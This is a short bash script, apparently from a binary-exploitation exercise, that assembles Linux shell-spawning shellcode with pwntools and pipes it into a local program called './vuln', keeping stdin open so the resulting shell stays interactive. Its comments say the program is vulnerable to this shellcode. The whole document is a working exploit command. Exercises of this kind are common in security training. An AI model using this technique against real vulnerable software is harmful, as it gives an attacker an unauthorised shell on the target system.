#!/usr/bin/bash

#you need to install python pwntools for this
(python -c "from pwn import *; print(asm(shellcraft.linux.sh()))" ; cat) | ./vuln

#there is a vulnerability in the ./vuln program that can be exploited by using this shellcode
